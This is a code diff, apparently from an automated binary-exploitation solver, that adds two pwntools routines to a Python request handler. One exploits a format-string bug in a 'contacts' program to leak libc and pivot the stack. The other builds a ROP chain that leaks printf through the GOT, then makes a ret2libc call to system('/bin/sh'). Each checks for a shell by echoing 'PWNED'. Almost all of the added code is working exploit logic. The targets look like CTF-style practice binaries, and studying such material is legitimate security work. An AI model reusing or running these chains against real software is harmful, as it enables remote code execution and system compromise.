@@ -80,11 +80,221 @@ def _build(elf, target: int, mode: str, arg: int, offset: int) -> tuple[bytes, s
     raise RuntimeError(f"unknown mode: {mode}")
 
 
+_CONTACTS_OFFSET_CACHE: dict[str, int] = {}
+
+
+def _contacts_parse(data: bytes) -> list[int]:
+    data = data.split(b"cccc")[0]
+    values = []
+    for part in data.split(b"0x")[1:]:
+        match = re.match(rb"[0-9a-f]+", part)
+        if match:
+            values.append(int(match.group(0), 16))
+    return values
+
+
+class _ContactsSession:
+    def __init__(self, path: str):
+        self.io = process(path)
+        self.menu_ready = False
+
+    def menu(self) -> None:
+        if not self.menu_ready:
+            self.io.recvuntil(b">>> ", timeout=5)
+            self.menu_ready = True
+
+    def create(self, name: bytes, desc: bytes) -> None:
+        self.menu()
+        self.io.sendline(b"1")
+        self.menu_ready = False
+        self.io.recvuntil(b"Contact info: \n")
+        self.io.recvuntil(b"Name: ")
+        self.io.sendline(name)
+        self.io.recvuntil(b"You have 10 numbers\n")
+        self.io.sendline(b"1111")
+        self.io.recvuntil(b"Length of description: ")
+        self.io.sendline(str(len(desc)).encode())
+        self.io.recvuntil(b"description:\n\t\t")
+        self.io.sendline(desc)
+
+    def display(self, timeout: float = 30) -> bytes:
+        self.menu()
+        self.io.sendline(b"4")
+        data = self.io.recvuntil(b">>> ", timeout=timeout)
+        self.menu_ready = True
+        return data
+
+    def close(self) -> None:
+        try:
+            self.io.close()
+        except Exception:  # noqa: BLE001
+            pass
+
+
+def _contacts_chain(path: str, marker: str) -> dict:
+    from pwn import flat
+
+    elf = _elf(path)
+    libc = elf.libc
+    started = time.perf_counter()
+    offset = _CONTACTS_OFFSET_CACHE.get(libc.path)
+    if offset is None:
+        probe = _ContactsSession(path)
+        try:
+            base = probe.io.libs()[libc.path]
+            probe.create(b"1111", b"%31$pAAAA")
+            leak = _contacts_parse(probe.display())[0]
+            offset = leak - base
+            _CONTACTS_OFFSET_CACHE[libc.path] = offset
+        finally:
+            probe.close()
+    session = _ContactsSession(path)
+    try:
+        session.create(b"1111", b"%31$pAAAA")
+        leak = _contacts_parse(session.display())[0]
+        base = leak - offset
+        system = base + libc.symbols["system"]
+        binsh = base + next(iter(libc.search(b"/bin/sh")))
+        desc2 = flat([system, b"bbbb", binsh, b"%6$p%11$pcccc"])
+        session.create(b"2222", desc2)
+        values = _contacts_parse(session.display())
+        if len(values) < 2:
+            return {"ok": True, "data": {
+                "solved": False, "error": "leak_parse_failed",
+                "values": [hex(value) for value in values],
+                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+        ebp_ptr, heap_ptr = values[-2], values[-1]
+        target = heap_ptr - 4
+        part1 = target // 2
+        part2 = target - part1
+        pivot = f"%{part1}x%{part2}x%6$n".encode()
+        session.create(b"3333", pivot)
+        session.display(timeout=180)
+        session.menu()
+        session.io.sendline(b"5")
+        time.sleep(0.3)
+        session.io.send(b"echo PWNED; exit\n")
+        output = session.io.recvrepeat(2) or b""
+        text = output.decode("utf-8", "replace")
+        return {"ok": True, "data": {
+            "solved": marker in text, "offset": offset, "leak": leak,
+            "heap": heap_ptr,
+            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+    except Exception as error:  # noqa: BLE001
+        return {"ok": True, "data": {
+            "solved": False, "error": f"{type(error).__name__}:{error}"[:120],
+            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+    finally:
+        session.close()
+
+
 def _handle(request: dict) -> dict:
     if IMPORT_ERROR is not None:
         return {"ok": False, "error": f"pwntools_unavailable:{IMPORT_ERROR}"}
     op = request.get("op")
     try:
+        if op == "staged_printf_leak":
+            from pwn import p32, p64, u32, u64
+
+            elf = _elf(request["path"])
+            libc = elf.libc
+            pack = p32 if elf.bits == 32 else p64
+            width = 4 if elf.bits == 32 else 8
+            unpack = u32 if elf.bits == 32 else u64
+            gets = elf.plt["gets"]
+            printf = elf.plt["printf"]
+            got = elf.got["printf"]
+            main = elf.symbols["main"]
+            bss = elf.symbols.get("buf2") or elf.bss()
+            rop = ROP(elf)
+            pop = None
+            if elf.bits == 32:
+                for insns in (["pop eax", "ret"], ["pop ebx", "ret"],
+                              ["pop ebp", "ret"]):
+                    try:
+                        pop = rop.find_gadget(insns).address
+                        break
+                    except Exception:  # noqa: BLE001
+                        continue
+            if pop is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "pop_gadget_missing"}}
+            offsets = [int(value) for value in request["offsets"]]
+            started = time.perf_counter()
+
+            def open_and_leak(leak_offset: int):
+                io = process(elf.path)
+                io.recvuntil(b"!!!", timeout=2)
+                chain = (b"A" * leak_offset + pack(gets) + pack(pop) + pack(bss)
+                         + pack(printf) + pack(main) + pack(bss) + pack(got))
+                io.sendline(chain)
+                time.sleep(0.2)
+                io.sendline(b"%s")
+                time.sleep(0.3)
+                raw = io.recvrepeat(0.6) or b""
+                leak = 0
+                for start in range(0, max(0, len(raw) - width + 1), 1):
+                    value = unpack(raw[start:start + width])
+                    if not (0xF0000000 <= value <= 0xFFFFFFFF):
+                        continue
+                    base = value - libc.symbols["printf"]
+                    if base % 0x1000 == 0 and 0 < base < 0x100000000:
+                        leak = value
+                        break
+                return io, leak
+
+            leak_offset = None
+            for candidate in offsets:
+                io = None
+                try:
+                    io, leak = open_and_leak(candidate)
+                    if leak:
+                        leak_offset = candidate
+                        break
+                except Exception:  # noqa: BLE001
+                    continue
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+            if leak_offset is None:
+                return {"ok": True, "data": {"solved": False,
+                                             "error": "leak_not_found",
+                                             "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+            for stage2_offset in offsets:
+                io = None
+                try:
+                    io, leak = open_and_leak(leak_offset)
+                    if not leak:
+                        continue
+                    base = leak - libc.symbols["printf"]
+                    system = base + libc.symbols["system"]
+                    shell = base + next(iter(libc.search(b"/bin/sh")))
+                    io.recvuntil(b"!!!", timeout=2)
+                    stage2 = b"A" * stage2_offset + pack(system) + pack(0) + pack(shell)
+                    io.sendline(stage2)
+                    time.sleep(0.2)
+                    io.send(b"echo PWNED; exit\n")
+                    output = io.recvall(timeout=3) or b""
+                    if b"PWNED" in output:
+                        return {"ok": True, "data": {
+                            "solved": True, "offset": stage2_offset,
+                            "leak_offset": leak_offset, "leak": leak,
+                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+                except Exception:  # noqa: BLE001
+                    continue
+                finally:
+                    if io is not None:
+                        try:
+                            io.close()
+                        except Exception:  # noqa: BLE001
+                            pass
+            return {"ok": True, "data": {"solved": False, "attempts": len(offsets),
+                                         "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
+        if op == "contacts_chain":
+            return _contacts_chain(request["path"], str(request.get("marker") or "PWNED"))
         if op == "ping":
             from importlib.metadata import PackageNotFoundError, version
 
